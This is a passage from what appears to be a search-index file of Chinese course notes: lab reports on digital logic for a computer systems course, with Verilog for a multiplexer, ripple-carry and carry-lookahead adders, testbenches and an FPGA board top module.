\u5c06\u8f93\u5165\u4fe1\u53f7\u8f6c\u4e3a\u8f93\u51fa\u4fe1\u53f7\u53ef\u4ee5\u5148\u5199\u51fa\u5bf9\u5e94\u7684\u771f\u503c\u8868\uff0c\u7136\u540e\u4f7f\u7528 Logisim \u5185\u7f6e\u7684 \"Combinational Analysis\" \u529f\u80fd\u6784\u5efa\u903b\u8f91\u7535\u8def\uff0c\u907f\u514d\u91cd\u590d\u52b3\u52a8","title":"\u5b9e\u9a8c\u601d\u8def"},{"location":"cs/system/cs1/lab1-1/#_9","text":"\u6839\u636e\u5f15\u811a\u4e0e LED \u6761\u7684\u5bf9\u5e94\u56fe\uff1a \u5e76\u5c06 B0 ~ B6 \u4f9d\u6b21\u89c6\u4e3a A ~ G \u4e03\u4e2a LED \u6761\uff0c\u53ef\u4ee5\u8fde\u63a5\u51fa\uff1a","title":"\u8f93\u51fa\u4fe1\u53f7\u4e0e\u4e03\u6bb5\u7ba1\u5f15\u811a\u8fde\u63a5"},{"location":"cs/system/cs1/lab1-1/#_10","text":"\u73b0\u6709\u8f93\u5165 A\uff08\u4ece\u9ad8\u4f4d\u5230\u4f4e\u4f4d A3 ~ A0\uff09\u4ee5\u4e8c\u8fdb\u5236\u5f62\u5f0f\u8868\u793a\u4e00\u4e2a\u6570\uff0c\u8981\u5c06\u5176\u8f6c\u6362\u4e3a\u4e03\u4f4d\u8f93\u51fa B0 ~ B6\uff0c\u771f\u503c\u8868\uff1a \u751f\u6210\u903b\u8f91\u7535\u8def\u56fe\uff1a","title":"\u8bd1\u7801\u5668"},{"location":"cs/system/cs1/lab1-1/#_11","text":"\u5df2\u7ecf\u7ec4\u5408\u4e86 0000 ~ 1111\uff080 ~ F\uff09\u6240\u6709\u60c5\u51b5\uff0c\u663e\u793a\u5747\u6b63\u5e38\u3002","title":"\u6d4b\u8bd5"},{"location":"cs/system/cs1/lab1-2/","text":"\u591a\u8def\u9009\u62e9\u5668\u7684\u8bbe\u8ba1\u548c\u6d4b\u8bd5 \u00b6 Abstract \u8ba1\u7b97\u673a\u7cfb\u7edf \u2160 lab1-2 \u5b9e\u9a8c\u62a5\u544a\uff082022.03.18 ~ 2022.04.01\uff09 Warning \u4ec5\u4f9b\u5b66\u4e60\u53c2\u8003\uff0c\u8bf7\u52ff\u6284\u88ad \u5b9e\u9a8c\u5185\u5bb9 \u00b6 \u4f7f\u7528 Logisim \u5b8c\u6210\u7535\u8def\u7ea7\u522b\u7684\u591a\u8def\u9009\u62e9\u5668 \u6253\u5f00 Logisim \u8f6f\u4ef6\uff0c\u6253\u5f00\u8f93\u5165\u6a21\u677f\u6587\u4ef6 multi.circ \u6587\u4ef6\u7684 Standard sample \u4f7f\u7528\u4e86 1 \u4f4d\u7684\u56db\u8def\u9009\u62e9\u5668\uff0c\u5b9e\u73b0\u4e86\u901a\u8fc7\u6539\u53d8 SW \u5bf9\u8f93\u5165\u7684\u9009\u62e9 \u5728\u672c\u6b21\u5b9e\u9a8c\u4e2d\uff0c\u4e3a\u4e86\u7406\u89e3\u591a\u8def\u9009\u62e9\u5668\u7684\u7535\u8def\u7ea7\u522b\u5177\u4f53\u5b9e\u73b0\uff0c\u653e\u5f03\u4f7f\u7528 Logisim \u5c01\u88c5\u7684\u591a\u8def\u9009\u62e9\u5668\uff0c\u53ea\u91c7\u7528\u95e8\u7ea7\u7535\u8def\uff0c\u5b8c\u6210 Standard sample \u7684\u529f\u80fd\u5b9e\u73b0 \u4f7f\u7528 Vivado \u5b9e\u73b0\u591a\u8def\u9009\u62e9\u5668 \u6253\u5f00 Vivado \u8f6f\u4ef6\uff0c\u6309\u7167\u5b9e\u9a8c 1 \u7684\u52a0\u5165\u6587\u4ef6\u65b9\u5f0f\uff0c\u52a0\u5165\u8bbe\u8ba1\u6587\u4ef6\u6837\u4f8b\u6587\u4ef6 Multi_2CH32.v \u540c\u6837\u52a0\u5165\u6d4b\u8bd5\u6587\u4ef6 Mul_test.v \u8fd9\u4e2a\u6d4b\u8bd5\u6587\u4ef6\u662f 32 \u4f4d 2 \u8def\u9009\u62e9\u5668\u7684\u6837\u4f8b\u6587\u4ef6\uff0c\u4f7f\u7528 Run Simulation \u53ef\u4ee5\u4eff\u771f\u3002\u901a\u8fc7\u66f4\u6539 SW \u7684\u503c\uff0c\u591a\u8def\u9009\u62e9\u5668\u53ef\u4ee5\u9009\u62e9 data1 \u6216\u8005 data0 \u8fdb\u884c\u8f93\u51fa \u672c\u6b21\u5b9e\u9a8c\u8981\u6c42\uff0c\u53c2\u8003\u8bbe\u8ba1\u6587\u4ef6\u6837\u4f8b\u6587\u4ef6 Multi_2CH32.v \u7684 32 \u4f4d 2 \u8def\u9009\u62e9\u5668\uff0c\u4f7f\u7528 verilog \u4ee3\u7801\u5b8c\u6210 32 \u4f4d 8 \u8def\u9009\u62e9\u5668\u3002\u547d\u540d\u4e3a Multi_8CH32.v \u540c\u7406\u9700\u8981\u53c2\u8003\u6d4b\u8bd5\u6587\u4ef6 Mul_test.v\uff0c\u81ea\u4e3b\u7f16\u5199\u6d4b\u8bd5\u7684 testbench \u6587\u4ef6 \u7535\u8def\u7ea7\u522b\u591a\u8def\u9009\u62e9\u5668\u642d\u5efa \u00b6 \u4e00\u4f4d\u56db\u8def\u9009\u62e9\u5668\u53ef\u4ee5\u4f7f\u7528\u4e09\u4e2a\u4e00\u4f4d\u4e8c\u8def\u9009\u62e9\u5668\u62fc\u63a5\u5f62\u6210\uff0c\u6240\u4ee5\u5148\u6765\u5b9e\u73b0\u4e00\u4f4d\u4e8c\u8def\u9009\u62e9\u5668 \u4e00\u4f4d\u4e8c\u8def\u9009\u62e9\u5668\u642d\u5efa \u00b6 \u5047\u8bbe\u4e24\u8def\u8f93\u5165\u5206\u522b\u4e3a A\u3001B\uff0c\u5f00\u5173\u4e3a S\uff0c\u5219\u6700\u7ec8\u7684\u8f93\u51fa\u4e3a A S +BS\uff0c\u8f6c\u4e3a\u903b\u8f91\u7535\u8def\uff1a \u4e00\u4f4d\u56db\u8def\u9009\u62e9\u5668 \u00b6 \u4f7f\u7528\u4e09\u4e2a\u4e00\u4f4d\u4e8c\u8def\u9009\u62e9\u5668\u8fde\u63a5\u5373\u53ef\uff1a \u6d4b\u8bd5 \u00b6 \u5df2\u7ecf\u4f7f\u7528\u5168\u90e8\u7684\u8f93\u5165\u548c\u5f00\u5173\u7ec4\u5408\u8fdb\u884c\u6d4b\u8bd5\uff0c\u7ed3\u679c\u5747\u6b63\u786e\u3002 Verilog \u5b9e\u73b0\u591a\u8def\u9009\u62e9\u5668 \u00b6 \u4eff\u7167\u6240\u7ed9\u7684 Multi_2CH32.v \u4f7f\u7528 case \u8bed\u53e5\u5373\u53ef\u5b9e\u73b0 \u4ee3\u7801 \u00b6 `timescale 1 ns / 1 ps module Multi_8CH32 ( input [ 2 : 0 ] SW , // \u4e09\u4f4d\u4e8c\u8fdb\u5236\u6570\u8868\u793a\u5f00\u5173\u9009\u62e9\u72b6\u6001 input [ 31 : 0 ] Data0 , // \u516b\u4e2a\u4e09\u5341\u4e8c\u4f4d\u6570\u5f85\u9009\u62e9 input [ 31 : 0 ] Data1 , input [ 31 : 0 ] Data2 , input [ 31 : 0 ] Data3 , input [ 31 : 0 ] Data4 , input [ 31 : 0 ] Data5 , input [ 31 : 0 ] Data6 , input [ 31 : 0 ] Data7 , output reg [ 31 : 0 ] Disp_num // \u8f93\u51fa\u7684 32 \u4f4d\u6570 ); always @ ( * ) begin case ( SW ) // \u5224\u65ad SW \u7684\u516b\u4e2a\u503c\uff0c\u5206\u522b\u4e3a\u8f93\u51fa\u8d4b\u503c 3 'b000 : begin Disp_num = Data0 ; end 3 'b001 : begin Disp_num = Data1 ; end 3 'b010 : begin Disp_num = Data2 ; end 3 'b011 : begin Disp_num = Data3 ; end 3 'b100 : begin Disp_num = Data4 ; end 3 'b101 : begin Disp_num = Data5 ; end 3 'b110 : begin Disp_num = Data6 ; end 3 'b111 : begin Disp_num = Data7 ; end endcase end endmodule \u6d4b\u8bd5 \u00b6 \u7f16\u5199\u4e86\u4eff\u771f\u6587\u4ef6\u7528\u6765\u6d4b\u8bd5\uff1a `timescale 1 ns / 1 ps module Mul_test (); reg [ 31 : 0 ] data0 = 32'hAA1111AA ; // \u4efb\u610f\u7684\u516b\u4e2a\u5f85\u9009\u62e9\u503c reg [ 31 : 0 ] data1 = 32'hBB2222BB ; reg [ 31 : 0 ] data2 = 32'hCC3333CC ; reg [ 31 : 0 ] data3 = 32'hDD4444DD ; reg [ 31 : 0 ] data4 = 32'hEE5555EE ; reg [ 31 : 0 ] data5 = 32'hFF6666FF ; reg [ 31 : 0 ] data6 = 32'h00777700 ; reg [ 31 : 0 ] data7 = 32'h11888811 ; reg [ 2 : 0 ] SW ; // \u5f00\u5173\u72b6\u6001 wire [ 31 : 0 ] out ; Multi_8CH32 ut ( . SW ( SW ), . Data0 ( data0 ), . Data1 ( data1 ), . Data2 ( data2 ), . Data3 ( data3 ), . Data4 ( data4 ), . Data5 ( data5 ), . Data6 ( data6 ), . Data7 ( data7 ), . Disp_num ( out ) ); initial begin SW = 3 'b000 ; // \u6d4b\u8bd5 SW \u6240\u6709\u503c\u4e0b\u7684\u7ed3\u679c # 125 SW = 3 'b001 ; # 125 SW = 3 'b010 ; # 125 SW = 3 'b011 ; # 125 SW = 3 'b100 ; # 125 SW = 3 'b101 ; # 125 SW = 3 'b110 ; # 125 SW = 3 'b111 ; end endmodule \u4eff\u771f\u7ed3\u679c\uff1a \u4ece\u65f6\u5e8f\u56fe\u548c\u4e0a\u9762\u6807\u6ce8\u7684\u6570\u503c\u53ef\u4ee5\u770b\u51fa\u786e\u5b9e\u6309\u7167\u6b63\u5e38\u9884\u671f\u8fd0\u884c\u4e86\u3002","title":"\u7cfb\u7edf I lab1-2"},{"location":"cs/system/cs1/lab1-2/#_1","text":"Abstract \u8ba1\u7b97\u673a\u7cfb\u7edf \u2160 lab1-2 \u5b9e\u9a8c\u62a5\u544a\uff082022.03.18 ~ 2022.04.01\uff09 Warning \u4ec5\u4f9b\u5b66\u4e60\u53c2\u8003\uff0c\u8bf7\u52ff\u6284\u88ad","title":"\u591a\u8def\u9009\u62e9\u5668\u7684\u8bbe\u8ba1\u548c\u6d4b\u8bd5"},{"location":"cs/system/cs1/lab1-2/#_2","text":"\u4f7f\u7528 Logisim \u5b8c\u6210\u7535\u8def\u7ea7\u522b\u7684\u591a\u8def\u9009\u62e9\u5668 \u6253\u5f00 Logisim \u8f6f\u4ef6\uff0c\u6253\u5f00\u8f93\u5165\u6a21\u677f\u6587\u4ef6 multi.circ \u6587\u4ef6\u7684 Standard sample \u4f7f\u7528\u4e86 1 \u4f4d\u7684\u56db\u8def\u9009\u62e9\u5668\uff0c\u5b9e\u73b0\u4e86\u901a\u8fc7\u6539\u53d8 SW \u5bf9\u8f93\u5165\u7684\u9009\u62e9 \u5728\u672c\u6b21\u5b9e\u9a8c\u4e2d\uff0c\u4e3a\u4e86\u7406\u89e3\u591a\u8def\u9009\u62e9\u5668\u7684\u7535\u8def\u7ea7\u522b\u5177\u4f53\u5b9e\u73b0\uff0c\u653e\u5f03\u4f7f\u7528 Logisim \u5c01\u88c5\u7684\u591a\u8def\u9009\u62e9\u5668\uff0c\u53ea\u91c7\u7528\u95e8\u7ea7\u7535\u8def\uff0c\u5b8c\u6210 Standard sample \u7684\u529f\u80fd\u5b9e\u73b0 \u4f7f\u7528 Vivado \u5b9e\u73b0\u591a\u8def\u9009\u62e9\u5668 \u6253\u5f00 Vivado \u8f6f\u4ef6\uff0c\u6309\u7167\u5b9e\u9a8c 1 \u7684\u52a0\u5165\u6587\u4ef6\u65b9\u5f0f\uff0c\u52a0\u5165\u8bbe\u8ba1\u6587\u4ef6\u6837\u4f8b\u6587\u4ef6 Multi_2CH32.v \u540c\u6837\u52a0\u5165\u6d4b\u8bd5\u6587\u4ef6 Mul_test.v \u8fd9\u4e2a\u6d4b\u8bd5\u6587\u4ef6\u662f 32 \u4f4d 2 \u8def\u9009\u62e9\u5668\u7684\u6837\u4f8b\u6587\u4ef6\uff0c\u4f7f\u7528 Run Simulation \u53ef\u4ee5\u4eff\u771f\u3002\u901a\u8fc7\u66f4\u6539 SW \u7684\u503c\uff0c\u591a\u8def\u9009\u62e9\u5668\u53ef\u4ee5\u9009\u62e9 data1 \u6216\u8005 data0 \u8fdb\u884c\u8f93\u51fa \u672c\u6b21\u5b9e\u9a8c\u8981\u6c42\uff0c\u53c2\u8003\u8bbe\u8ba1\u6587\u4ef6\u6837\u4f8b\u6587\u4ef6 Multi_2CH32.v \u7684 32 \u4f4d 2 \u8def\u9009\u62e9\u5668\uff0c\u4f7f\u7528 verilog \u4ee3\u7801\u5b8c\u6210 32 \u4f4d 8 \u8def\u9009\u62e9\u5668\u3002\u547d\u540d\u4e3a Multi_8CH32.v \u540c\u7406\u9700\u8981\u53c2\u8003\u6d4b\u8bd5\u6587\u4ef6 Mul_test.v\uff0c\u81ea\u4e3b\u7f16\u5199\u6d4b\u8bd5\u7684 testbench \u6587\u4ef6","title":"\u5b9e\u9a8c\u5185\u5bb9"},{"location":"cs/system/cs1/lab1-2/#_3","text":"\u4e00\u4f4d\u56db\u8def\u9009\u62e9\u5668\u53ef\u4ee5\u4f7f\u7528\u4e09\u4e2a\u4e00\u4f4d\u4e8c\u8def\u9009\u62e9\u5668\u62fc\u63a5\u5f62\u6210\uff0c\u6240\u4ee5\u5148\u6765\u5b9e\u73b0\u4e00\u4f4d\u4e8c\u8def\u9009\u62e9\u5668","title":"\u7535\u8def\u7ea7\u522b\u591a\u8def\u9009\u62e9\u5668\u642d\u5efa"},{"location":"cs/system/cs1/lab1-2/#_4","text":"\u5047\u8bbe\u4e24\u8def\u8f93\u5165\u5206\u522b\u4e3a A\u3001B\uff0c\u5f00\u5173\u4e3a S\uff0c\u5219\u6700\u7ec8\u7684\u8f93\u51fa\u4e3a A S +BS\uff0c\u8f6c\u4e3a\u903b\u8f91\u7535\u8def\uff1a","title":"\u4e00\u4f4d\u4e8c\u8def\u9009\u62e9\u5668\u642d\u5efa"},{"location":"cs/system/cs1/lab1-2/#_5","text":"\u4f7f\u7528\u4e09\u4e2a\u4e00\u4f4d\u4e8c\u8def\u9009\u62e9\u5668\u8fde\u63a5\u5373\u53ef\uff1a","title":"\u4e00\u4f4d\u56db\u8def\u9009\u62e9\u5668"},{"location":"cs/system/cs1/lab1-2/#_6","text":"\u5df2\u7ecf\u4f7f\u7528\u5168\u90e8\u7684\u8f93\u5165\u548c\u5f00\u5173\u7ec4\u5408\u8fdb\u884c\u6d4b\u8bd5\uff0c\u7ed3\u679c\u5747\u6b63\u786e\u3002","title":"\u6d4b\u8bd5"},{"location":"cs/system/cs1/lab1-2/#verilog","text":"\u4eff\u7167\u6240\u7ed9\u7684 Multi_2CH32.v \u4f7f\u7528 case \u8bed\u53e5\u5373\u53ef\u5b9e\u73b0","title":"Verilog \u5b9e\u73b0\u591a\u8def\u9009\u62e9\u5668"},{"location":"cs/system/cs1/lab1-2/#_7","text":"`timescale 1 ns / 1 ps module Multi_8CH32 ( input [ 2 : 0 ] SW , // \u4e09\u4f4d\u4e8c\u8fdb\u5236\u6570\u8868\u793a\u5f00\u5173\u9009\u62e9\u72b6\u6001 input [ 31 : 0 ] Data0 , // \u516b\u4e2a\u4e09\u5341\u4e8c\u4f4d\u6570\u5f85\u9009\u62e9 input [ 31 : 0 ] Data1 , input [ 31 : 0 ] Data2 , input [ 31 : 0 ] Data3 , input [ 31 : 0 ] Data4 , input [ 31 : 0 ] Data5 , input [ 31 : 0 ] Data6 , input [ 31 : 0 ] Data7 , output reg [ 31 : 0 ] Disp_num // \u8f93\u51fa\u7684 32 \u4f4d\u6570 ); always @ ( * ) begin case ( SW ) // \u5224\u65ad SW \u7684\u516b\u4e2a\u503c\uff0c\u5206\u522b\u4e3a\u8f93\u51fa\u8d4b\u503c 3 'b000 : begin Disp_num = Data0 ; end 3 'b001 : begin Disp_num = Data1 ; end 3 'b010 : begin Disp_num = Data2 ; end 3 'b011 : begin Disp_num = Data3 ; end 3 'b100 : begin Disp_num = Data4 ; end 3 'b101 : begin Disp_num = Data5 ; end 3 'b110 : begin Disp_num = Data6 ; end 3 'b111 : begin Disp_num = Data7 ; end endcase end endmodule","title":"\u4ee3\u7801"},{"location":"cs/system/cs1/lab1-2/#_8","text":"\u7f16\u5199\u4e86\u4eff\u771f\u6587\u4ef6\u7528\u6765\u6d4b\u8bd5\uff1a `timescale 1 ns / 1 ps module Mul_test (); reg [ 31 : 0 ] data0 = 32'hAA1111AA ; // \u4efb\u610f\u7684\u516b\u4e2a\u5f85\u9009\u62e9\u503c reg [ 31 : 0 ] data1 = 32'hBB2222BB ; reg [ 31 : 0 ] data2 = 32'hCC3333CC ; reg [ 31 : 0 ] data3 = 32'hDD4444DD ; reg [ 31 : 0 ] data4 = 32'hEE5555EE ; reg [ 31 : 0 ] data5 = 32'hFF6666FF ; reg [ 31 : 0 ] data6 = 32'h00777700 ; reg [ 31 : 0 ] data7 = 32'h11888811 ; reg [ 2 : 0 ] SW ; // \u5f00\u5173\u72b6\u6001 wire [ 31 : 0 ] out ; Multi_8CH32 ut ( . SW ( SW ), . Data0 ( data0 ), . Data1 ( data1 ), . Data2 ( data2 ), . Data3 ( data3 ), . Data4 ( data4 ), . Data5 ( data5 ), . Data6 ( data6 ), . Data7 ( data7 ), . Disp_num ( out ) ); initial begin SW = 3 'b000 ; // \u6d4b\u8bd5 SW \u6240\u6709\u503c\u4e0b\u7684\u7ed3\u679c # 125 SW = 3 'b001 ; # 125 SW = 3 'b010 ; # 125 SW = 3 'b011 ; # 125 SW = 3 'b100 ; # 125 SW = 3 'b101 ; # 125 SW = 3 'b110 ; # 125 SW = 3 'b111 ; end endmodule \u4eff\u771f\u7ed3\u679c\uff1a \u4ece\u65f6\u5e8f\u56fe\u548c\u4e0a\u9762\u6807\u6ce8\u7684\u6570\u503c\u53ef\u4ee5\u770b\u51fa\u786e\u5b9e\u6309\u7167\u6b63\u5e38\u9884\u671f\u8fd0\u884c\u4e86\u3002","title":"\u6d4b\u8bd5"},{"location":"cs/system/cs1/lab2-1/","text":"\u590d\u6742\u64cd\u4f5c\uff1a\u52a0\u6cd5\u5668 \u00b6 Abstract \u8ba1\u7b97\u673a\u7cfb\u7edf \u2160 lab2-1 \u5b9e\u9a8c\u62a5\u544a\uff082022.03.25 ~ 2022.04.08\uff09 Warning \u4ec5\u4f9b\u5b66\u4e60\u53c2\u8003\uff0c\u8bf7\u52ff\u6284\u88ad \u5b9e\u9a8c\u5185\u5bb9 \u00b6 32 \u4f4d\u884c\u6ce2\u8fdb\u4f4d\u52a0\u6cd5\u5668\uff0832-bit ripple-carry adder\uff09 \u6309\u7167 ripple-carry adder \u539f\u7406\uff0c\u4f7f\u7528 verilog \u5b9e\u73b0 32-bit \u7684 ripple-carry adder \u7f16\u5199\u4eff\u771f\u6d4b\u8bd5\u4ee3\u7801\uff0c\u5bf9\u6240\u5199\u52a0\u6cd5\u5668\u505a\u4e0d\u5c11\u4e8e 5 \u7ec4\u6837\u4f8b\u7684\u4eff\u771f\u6d4b\u8bd5 \u4f7f\u7528\u63d0\u4f9b\u7684\u6d4b\u8bd5\u73af\u5883\u8fdb\u884c\u4e0a\u677f\u6d4b\u8bd5 32 \u4f4d\u8d85\u524d\u8fdb\u4f4d\u52a0\u6cd5\u5668\uff0832-bit carry-lookahead adder\uff09 \u6309\u7167 carry-lookahead adder \u539f\u7406\uff0c\u4f7f\u7528 verilog \u5b9e\u73b0 32-bit \u7684 carry-lookahead adder \u7f16\u5199\u4eff\u771f\u6d4b\u8bd5\u4ee3\u7801\uff0c\u5bf9\u6240\u5199\u52a0\u6cd5\u5668\u505a\u4e0d\u5c11\u4e8e 5 \u7ec4\u6837\u4f8b\u7684\u4eff\u771f\u6d4b\u8bd5 \u4f7f\u7528\u63d0\u4f9b\u7684\u6d4b\u8bd5\u73af\u5883\u8fdb\u884c\u4e0a\u677f\u6d4b\u8bd5 32 \u4f4d\u884c\u6ce2\u8fdb\u4f4d\u52a0\u6cd5\u5668 \u00b6 \u4e3b\u4f53\u601d\u8def\u5c31\u662f\u4f7f\u7528\u4e24\u4e2a 16 \u4f4d\u52a0\u6cd5\u5668\u4e32\u8054\u6210 32 \u4f4d\u52a0\u6cd5\u5668\u300216 \u4f4d\u52a0\u6cd5\u5668\u4f7f\u7528 4 \u4e2a 4 \u4f4d\u52a0\u6cd5\u5668\u4e32\u8054\uff0c4 \u4f4d\u52a0\u6cd5\u5668\u4f7f\u7528 4 \u4e2a\u5168\u52a0\u5668\u4e32\u8054 \u4e00\u4f4d\u5168\u52a0\u5668 \u00b6 lab 1-1 \u4e2d\u5df2\u7ecf\u505a\u8fc7\u5bf9\u5e94\u7684\u903b\u8f91\u7535\u8def\uff0c\u53ea\u9700\u8981\u5c06\u5176\u5199\u6210 verilog \u8bed\u8a00\uff1a module FullAdder ( input A , input B , input Cin , output S , output Cout ); assign S = A ^ B ^ Cin ; assign Cout = ( A & B ) | (( A ^ B ) & Cin ); endmodule 4~32 \u4f4d\u884c\u6ce2\u8fdb\u4f4d\u52a0\u6cd5\u5668 \u00b6 module RippleCarryAdder4 ( input [ 3 : 0 ] A , input [ 3 : 0 ] B , input Cin , output [ 3 : 0 ] S , output Cout ); wire cout_1 , cout_2 , cout_3 ; // \u8fdb\u4f4d\uff0c\u7528\u4e8e\u4e32\u8054\u52a0\u6cd5\u5668 FullAdder adder0 ( . A ( A [ 0 ]), . B ( B [ 0 ]), . Cin ( Cin ), . S ( S [ 0 ]), . Cout ( cout_1 ) ); FullAdder adder1 ( . A ( A [ 1 ]), . B ( B [ 1 ]), . Cin ( cout_1 ), // \u8fde\u63a5 adder0 \u7684\u8fdb\u4f4d . S ( S [ 1 ]), . Cout ( cout_2 ) ); FullAdder adder2 ( . A ( A [ 2 ]), . B ( B [ 2 ]), . Cin ( cout_2 ), // \u8fde\u63a5 adder1 \u7684\u8fdb\u4f4d . S ( S [ 2 ]), . Cout ( cout_3 ) ); FullAdder adder3 ( . A ( A [ 3 ]), . B ( B [ 3 ]), . Cin ( cout_3 ), // \u8fde\u63a5 adder2 \u7684\u8fdb\u4f4d . S ( S [ 3 ]), . Cout ( Cout ) ); endmodule module RippleCarryAdder16 ( input [ 15 : 0 ] A , input [ 15 : 0 ] B , input Cin , output [ 15 : 0 ] S , output Cout ); wire cout_1 , cout_2 , cout_3 ; // \u4e0e\u56db\u4f4d\u52a0\u6cd5\u5668\u540c\u7406 RippleCarryAdder4 adder0 ( . A ( A [ 3 : 0 ]), . B ( B [ 3 : 0 ]), . Cin ( Cin ), . S ( S [ 3 : 0 ]), . Cout ( cout_1 ) ); RippleCarryAdder4 adder1 ( . A ( A [ 7 : 4 ]), . B ( B [ 7 : 4 ]), . Cin ( cout_1 ), . S ( S [ 7 : 4 ]), . Cout ( cout_2 ) ); RippleCarryAdder4 adder2 ( . A ( A [ 11 : 8 ]), . B ( B [ 11 : 8 ]), . Cin ( cout_2 ), . S ( S [ 11 : 8 ]), . Cout ( cout_3 ) ); RippleCarryAdder4 adder3 ( . A ( A [ 15 : 12 ]), . B ( B [ 15 : 12 ]), . Cin ( cout_3 ), . S ( S [ 15 : 12 ]), . Cout ( Cout ) ); endmodule module RippleCarryAdder ( input [ 31 : 0 ] A , input [ 31 : 0 ] B , output [ 31 : 0 ] S ); wire cout , Cout ; RippleCarryAdder16 adder0 ( . A ( A [ 15 : 0 ]), . B ( B [ 15 : 0 ]), . Cin ( 1 'b0 ), . S ( S [ 15 : 0 ]), . Cout ( cout ) ); RippleCarryAdder16 adder1 ( . A ( A [ 31 : 16 ]), . B ( B [ 31 : 16 ]), . Cin ( cout ), . S ( S [ 31 : 16 ]), . Cout ( Cout ) ); endmodule \u4eff\u771f\u6d4b\u8bd5 TestBench \u00b6 \u7f16\u5199\u4e86\u5305\u542b\u4e94\u7ec4\u6d4b\u8bd5\u6837\u4f8b\u7684 test bench\uff1a module TestAdder (); reg [ 31 : 0 ] A ; reg [ 31 : 0 ] B ; wire [ 31 : 0 ] S ; RippleCarryAdder adder ( . A ( A ), . B ( B ), . S ( S ) ); initial begin A = 32'h00000001 ; B = 32'h00000001 ; # 200 A = 32'h00000AAA ; B = 32'h00000BBB ; # 200 A = 32'h12345678 ; B = 32'h23456789 ; # 200 A = 32'h87654321 ; B = 32'h12345678 ; # 200 A = 32'h10101010 ; B = 32'h4DEF67BC ; end endmodule \u4eff\u771f\u7ed3\u679c\uff1a \u53ef\u89c1\u52a0\u6cd5\u8fd0\u7b97\u6b63\u5e38 \u8fde\u63a5\u6d4b\u8bd5\u73af\u5883 \u00b6 \u6309\u7167\u63d0\u4f9b\u7684\u6d4b\u8bd5\u73af\u5883\u4ee5\u53ca\u4f7f\u7528\u65b9\u6cd5\u521b\u5efa\u4e00\u4e2a\u9876\u5c42\u6a21\u5757\u6765\u8c03\u7528\u52a0\u6cd5\u5668\uff0c\u5e76\u4e14\u5b9e\u73b0\u677f\u5b50\u4e0a\u7684\u4ea4\u4e92\u3002\u8f7d\u5165 ENV.edf ENV_stub.v \u6587\u4ef6\uff0c\u4ee5\u53ca Nexys4.xdc constraints\uff0c\u7f16\u5199\u9876\u5c42\u6a21\u5757\uff1a module Top ( input RSTN , clk_100mhz , input BTNL , BTNR , BTNU , BTND , BTNC , input [ 15 : 0 ] SW , output [ 15 : 0 ] LED , output [ 7 : 0 ] SEGMENT , AN ); wire rst = ~ RSTN ; assign LED = SW ; wire [ 31 : 0 ] Ai , Bi ; wire [ 31 : 0 ] sum ; // \u52a0\u6cd5\u7ed3\u679c ENV env ( . clk ( clk_100mhz ), . rst ( rst ), . SW ( SW ), . BTNL ( BTNL ), . BTNR ( BTNR ), . BTNU ( BTNU ), . BTND ( BTND ), . BTNC ( BTNC ), . SEGMENT ( SEGMENT ), . AN ( AN ), . Ai ( Ai ), . Bi ( Bi ), . SUM ( sum ), // \u8fde\u63a5\u7ed3\u679c . MUL ( prod ) ); RippleCarryAdder adder ( . A ( Ai ), . B ( Bi ), . S ( sum ) ); endmodule \u4e0a\u677f\u6d4b\u8bd5\u4e5f\u4e00\u5207\u6b63\u5e38\u3002 32 \u4f4d\u8d85\u524d\u8fdb\u4f4d\u52a0\u6cd5\u5668 \u00b6 \u6309\u7167\u7ed9\u5b9a\u7684\u601d\u8def\uff0c\u4f7f\u7528 4 \u4e2a 4 \u4f4d\u8d85\u524d\u8fdb\u4f4d\u52a0\u6cd5\u5668\u6309\u7167\u8d85\u524d\u8fdb\u4f4d\u903b\u8f91\u62fc\u6210 16 \u4f4d\u8d85\u524d\u8fdb\u4f4d\u52a0\u6cd5\u5668\uff0c\u7136\u540e\u4f7f\u7528\u884c\u6ce2\u8fdb\u4f4d\u903b\u8f91\u4e32\u8054\u6210 32 \u4f4d\u52a0\u6cd5\u5668\u3002 4 \u4f4d\u8d85\u524d\u8fdb\u4f4d\u52a0\u6cd5\u5668 \u00b6 \u6839\u636e\u7ed9\u51fa\u7684\u4e00\u7cfb\u5217\u516c\u5f0f\u5373\u53ef\u5199\u51fa\u4ee3\u7801\uff0c\u5e76\u4e14\u4e3a\u4e86\u8fde\u63a5\u51fa 16 \u4f4d\u8d85\u524d\u8fdb\u4f4d\u52a0\u6cd5\u5668\uff0c\u8fd8\u8981 output \u6574\u4f53\u7684 P \u548c G \u4fe1\u53f7\uff0c\u4ee3\u7801\uff1a module CarryLookaheadAdder4 ( input [ 3 : 0 ] A , input [ 3 : 0 ] B , input Cin , output [ 3 : 0 ] S , output P , output G , output Cout ); wire [ 3 : 0 ] p ; wire [ 3 : 0 ] g ; assign p = A ^ B ; assign g = A & B ; wire [ 4 : 0 ] c ; assign c [ 0 ] = Cin ; assign c [ 1 ] = g [ 0 ] | ( p [ 0 ] & c [ 0 ]); assign c [ 2 ] = g [ 1 ] | ( p [ 1 ] & g [ 0 ]) | ( p [ 1 ] & p [ 0 ] & c [ 0 ]); assign c [ 3 ] = g [ 2 ] | ( p [ 2 ] & g [ 1 ]) | ( p [ 2 ] & p [ 1 ] & g [ 0 ]) | ( p [ 2 ] & p [ 1 ] & p [ 0 ] & c [ 0 ]); assign c [ 4 ] = g [ 3 ] | ( p [ 3 ] & g [ 2 ]) | ( p [ 3 ] & p [ 2 ] & g [ 1 ]) | ( p [ 3 ] & p [ 2 ] & p [ 1 ] & g [ 0 ]) | ( p [ 3 ] & p [ 2 ] & p [ 1 ] & p [ 0 ] & c [ 0 ]); assign S = p ^ c [ 3 : 0 ]; assign Cout = c [ 4 ]; assign P = p [ 0 ] & p [ 1 ] & p [ 2 ] & p [ 3 ]; assign G = g [ 3 ] | ( p [ 3 ] & g [ 2 ]) | ( p [ 3 ] & p [ 2 ] & g [ 1 ]) | ( p [ 3 ] & p [ 2 ] & p [ 1 ] & g [ 0 ]); endmodule 16 \u4f4d\u8d85\u524d\u8fdb\u4f4d\u52a0\u6cd5\u5668 \u00b6 \u4f7f\u7528\u56db\u4e2a 4 \u4f4d\u8d85\u524d\u8fdb\u4f4d\u52a0\u6cd5\u5668\uff0c\u6839\u636e\u8d85\u524d\u8fdb\u4f4d\u903b\u8f91\u62fc\u63a5\u5728\u4e00\u8d77\u3002\u5373\u56db\u4e2a 4 \u4f4d\u52a0\u6cd5\u5668\u540c\u65f6\u8ba1\u7b97\uff0c\u8fdb\u4f4d\u4e0d\u4f9d\u6b21\u4f20\u5165\u800c\u662f\u5728\u5f53\u524d\u6a21\u5757\u4e2d\u6839\u636e P \u548c G \u8d85\u524d\u8ba1\u7b97\u5f97\u51fa\uff0c\u4ee3\u7801\uff1a module CarryLookaheadAdder16 